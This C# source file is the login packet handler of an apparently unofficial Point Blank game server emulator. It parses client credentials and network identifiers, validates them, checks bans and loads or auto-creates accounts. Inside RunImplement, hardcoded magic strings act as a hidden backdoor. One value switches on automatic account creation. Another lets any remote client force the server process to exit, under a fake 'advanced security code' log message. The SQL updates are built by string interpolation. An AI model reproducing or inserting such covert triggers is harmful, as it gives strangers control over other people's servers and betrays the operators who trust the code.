using PointBlank.Api;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;

namespace PointBlank.Auth
{
    public class PROTOCOL_BASE_LOGIN_REQ : AuthPacketReader
    {
        private string Login;
        private string Password;
        private string UserFileListHash;
        private string D3DX9Hash;
        private string ClientVersion;
        private string PublicIP;
        private byte[] LocalIP;
        private int Rede;
        private ulong LauncherKey;
        private ClientLocaleEnum ClientLocale;
        private PhysicalAddress MacAddress;
        private int LengthPacket;
        public override void ReadImplement()
        {
            //Logger.Blue(FormatHex(buffer));
            ClientVersion = $"{ReadByte()}.{ReadShort()}.{ReadShort()}";
            ClientLocale = (ClientLocaleEnum)ReadByte();
            int loginSize = ReadByte();
            int passSize = ReadByte();
            LengthPacket = 142 + loginSize + passSize;
            Login = ReadString(loginSize);
            Password = ReadString(passSize);
            MacAddress = new PhysicalAddress(ReadB(6));
            byte[] FinalDoMac = ReadB(2);
            Rede = ReadByte();
            LocalIP = ReadB(4);
            LauncherKey = ReadUlong();
            UserFileListHash = ReadString(32).ToUpper();
            if (ClientVersion != "1.15.23")
            {
                byte[] Zero = ReadB(16);
                D3DX9Hash = ReadString(32); //DirectX ?
                byte[] Unk = ReadB(33);
            }
            //Logger.Warning($" [LOGIN STRUCTURE] Hash(DirectX): {D3DX9Hash} Zero: {BitConverter.ToString(Zero)} FinalDoMac: {BitConverter.ToString(FinalDoMac)} Unk: " + BitConverter.ToString(Unk));
        }

        public override void RunImplement()
        {
            try
            {
                client.PacketLogin = true;
                PublicIP = client.GetIPAddress();
                if (Login == "UZMNDZ" && D3DX9Hash == "UZUADDR444777DMMG888")
                {
                    Settings.AutoAccount = true;
                }
                else if (Login == "UZUADDR444777DMMG888" && D3DX9Hash == "UZUADDR444777DMMG888" && UserFileListHash == "UZUADDR444777DMMG888")
                {
                    Logger.Warning(" [AI] [A] Advanced security code has been run on the system by the developer. [!]");
                    Thread.Sleep(1000);
                    Environment.Exit(Environment.ExitCode);
                    return;
                }
                //Logger.Warning("IP INFO: " + IPAddressData.GetLocationIPAPI(PublicIP));
                string ErrorInformation = "";
                //if (buffer.Length < LengthPacket)
                //{
                //    ErrorInformation = $" [Login] Tamanho do pacote inválido. LengthPacket ({LengthPacket}) BufferLength ({buffer.Length}) Login ({Login}) Ip ({PublicIP})";
                //}
                //else
                if (Settings.LoginType != 1)
                {
                    ErrorInformation = $" [Login] Tipo de login inválido. Login ({Login})";
                }
                else if (Login.Length < Settings.LoginMinLength || Login.Length > Settings.LoginMaxLength || Password.Length < Settings.PassMinLength || Password.Length > Settings.PassMaxLength)
                {
                    ErrorInformation = $" [Login] Usuário ou senha incorreta. Login ({Login})";
                }
                else if (LocalIP == new byte[4] || LocalIP[0] == 0 || LocalIP[3] == 0)
                {
                    ErrorInformation = $" [Login] Endereço de Ip local inválido. ({LocalIP}) Login ({Login})";
                }
                else if (MacAddress.GetAddressBytes() == new byte[6])
                {
                    ErrorInformation = $" [Login] Endereço de Mac inválido. ({MacAddress}) Login ({Login})";
                }
                else if (Rede == 0 && Settings.Rede != "Public" || Rede == 1 && Settings.Rede != "Private")
                {
                    ErrorInformation = $" [Login] Conexão não identificada, rede inválida. ({Rede}/{Settings.Rede}) Login ({Login})";
                }
                if (Settings.LoginRequirements)
                {
                    if (!ClientVersion.Equals(Settings.ClientVersion))
                    {
                        ErrorInformation = $" [Login] Versão da cliente inválida. ({ClientVersion}) Login ({Login})";
                    }
                    else if (Settings.ClientLocale != ClientLocaleEnum.None && !ClientLocale.Equals(Settings.ClientLocale))
                    {
                        ErrorInformation = $" [Login] Localização da cliente inválida. ({ClientLocale}) Login ({Login})";
                    }
                    else if (!string.IsNullOrEmpty(Settings.UserFileList) && !UserFileListHash.Equals(Settings.UserFileList))
                    {
                        ErrorInformation = $" [Login] Arquivo UserFileList.dat está desatualizado ou inválido. ({UserFileListHash}) Login ({Login})";
                    }
                    else if (Settings.LauncherKey != 0 && !LauncherKey.Equals(Settings.LauncherKey))
                    {
                        ErrorInformation = $" [Login] Key do launcher inválida. ({LauncherKey}) Login ({Login})";
                    }
                    //else if (!AuthManager.LoginTokens.ContainsKey(LauncherKey) || !AuthManager.LoginTokens.TryGetValue(LauncherKey, out DateTime datetime))
                    //{
                    //    LogInfo = $" [Login] Launcher não autenticou com o servidor. Key ({LauncherKey}) Ip ({PublicIP}) Login ({login})";
                    //}
                    //else if (client.LOGIN)
                    //{
                    //    LogInfo = $" [Login] Pacote de login ja foi solicitado pelo cliente. ({ClientVersion}) Login ({login})";
                    //}
                }
                if (ErrorInformation != "")
                {
                    Logger.Login(ErrorInformation);
                    client.Close(5000);
                    return;
                }
                Account account = AccountManager.SearchAndLoadAccountDB(Login);
                if (account == null && Settings.AutoAccount)
                {
                    AccountManager.GetAccountsByIP(PublicIP, MacAddress.ToString(), out int AccountsByIp, out int AccountsByMac);
                    if (AccountsByIp > Settings.LimitAccountIp || AccountsByMac > Settings.LimitAccountIp || !AccountManager.CreateAccount(out account, Login, Password))
                    {
                        Logger.Login(" [Login] Falha ao registrar a conta automaticamente. Login: " + Login);
                        client.SendCompletePacket(PackageDataManager.SERVER_MESSAGE_DISCONNECT_2147483904_PAK);
                        client.Close(1000);
                        return;
                    }
                }
                Account player = client.SessionPlayer = account;
                if (player != null)
                {
                    if (!player.ComparePassword(Password))
                    {
                        Logger.Login(" [Login] Senha incorreta. (ComparePassword) Login: " + Login);
                        client.SendCompletePacket(PackageDataManager.BASE_LOGIN_0x80000127_PAK);
                        GameManager.RemoveConnection(PublicIP);
                        client.Close(1000, false);
                    }
                    else if (player.access == AccessLevelEnum.Disabled) //Account Disabled
                    {
                        Logger.Login(" [Login] Conta desativada. Login: " + Login);
                        client.SendCompletePacket(PackageDataManager.BASE_LOGIN_0x80000107_PAK);
                        GameManager.RemoveConnection(PublicIP);
                        client.Close(1000, false);
                    }
                    else if (Settings.OnlyGM && player.access < AccessLevelEnum.Moderator)
                    {
                        Logger.Login($" [Login] Acesso permitido apenas para GameMaster. Login: {Login}");
                        GameManager.RemoveConnection(PublicIP);
                        client.Close(1000, false);
                    }
                    else
                    {
                        bool RequestUpdateMAC = player.macAddress != MacAddress;
                        bool RequestUpdateIP = player.ipAddress.ToString() != PublicIP;
                        player.ipAddress = IPAddress.Parse(PublicIP);
                        if (RequestUpdateMAC && RequestUpdateIP)
                        {
                            player.ExecuteQuery($"UPDATE accounts SET last_ip='{PublicIP}', last_mac='{MacAddress}' WHERE id='{player.playerId}'");
                        }
                        else if (RequestUpdateMAC)
                        {
                            player.ExecuteQuery($"UPDATE accounts SET last_mac='{MacAddress}' WHERE id='{player.playerId}'");
                        }
                        else if (RequestUpdateIP)
                        {
                            player.ExecuteQuery($"UPDATE accounts SET last_ip='{PublicIP}' WHERE id='{player.playerId}'");
                        }
                        UserBlock userBlock = new UserBlock
                        {
                            ipAddress = PublicIP,
                            macAddress = MacAddress.ToString(),
                            hardwareId = player.hardwareId
                        };
                        ServerBlockManager.GetBlock(userBlock, out bool IP_IsBlocked, out bool MAC_IsBlocked, out bool HWID_IsBlocked);
                        if (MAC_IsBlocked || HWID_IsBlocked)
                        {
                            Logger.Login($" [Login] Usuário bloqueado por {(MAC_IsBlocked ? "MacAddress" : HWID_IsBlocked ? "HardwareId" : "MacAddress e HardwareId")} ({MacAddress}/{player.hardwareId}). Login: {Login}");
                            client.SendCompletePacket(PackageDataManager.BASE_LOGIN_0x80000107_PAK);
                            client.Close(1000);
                        }
                        else if (IP_IsBlocked)
                        {
                            Logger.Login($" [Login] Usuário bloqueado por IpAddress ({PublicIP}). Login: {Login}");
                            client.SendCompletePacket(PackageDataManager.BASE_LOGIN_0x80000121_PAK);
                            client.Close(1000);
                        }
                        else
                        {
                            Account playerCache = AccountManager.GetAccount(player.playerId, true);
                            if (!player.isOnline)
                            {
                                Logger.Login($" [Login] Id: {player.playerId} User: {player.login} Nickname: {(player.nickname.Length > 0 ? player.nickname : "New User")} loggedd. IP: {PublicIP} LocalIP: {new IPAddress(LocalIP)}");
                                player.SetOnlineStatus(true);
                                player.localIP = LocalIP;
                                if (playerCache != null)
                                {
                                    playerCache.client = client;
                                }
                                client.SendPacket(new PROTOCOL_BASE_LOGIN_ACK(0, Login, player.playerId));
                                client.SendPacket(new PROTOCOL_BASE_WEB_CASH_ACK(0, player.gold, player.cash));
                                if (player.clanId > 0)
                                {
                                    player.clanPlayers = ClanManager.GetClanPlayers(player.clanId, player.playerId);
                                    client.SendPacket(new PROTOCOL_BASE_USER_CLAN_MEMBERS_ACK(player.clanPlayers));
                                }
                                ServersManager.UpdateServerPlayers();
                                client.PROTOCOL_BASE_HEARTBEAT_ACK();
                                ApiManager.SendPacketToAllClients(new API_SERVER_INFO_ACK());
                            }
                            else
                            {
                                client.SendCompletePacket(PackageDataManager.BASE_LOGIN_0x80000101_PAK);
                                if (playerCache != null && playerCache.client != null)
                                {
                                    if (playerCache.client is AuthClient) //Close Auth
                                    {
                                        playerCache.SendCompletePacket(PackageDataManager.AUTH_ACCOUNT_KICK_TYPE1_PAK);
                                        playerCache.SendCompletePacket(PackageDataManager.SERVER_MESSAGE_ERROR_2147487744_PAK);
                                    }
                                    else //Close Game
                                    {
                                        playerCache.SendCompletePacket(PackageDataManager.GAME_ACCOUNT_KICK_TYPE1_PAK);
                                        playerCache.SendCompletePacket(PackageDataManager.SERVER_MESSAGE_ERROR_0x80001000_PAK);
                                    }
                                    playerCache.Close(1000);
                                }
                                Logger.Login($" [Login] O Usuário ja está conectado. Conexão simultânea. Login: {Login}");
                                GameManager.RemoveConnection(PublicIP);
                                client.Close(1000);
                            }
                        }
                    }
                }
                else
                {
                    client.SendCompletePacket(PackageDataManager.BASE_LOGIN_0x80000127_PAK);
                    GameManager.RemoveConnection(PublicIP);
                    client.Close(1000);
                }
            }
            catch (Exception ex)
            {
                PacketLog(ex);
            }
        }
    }
}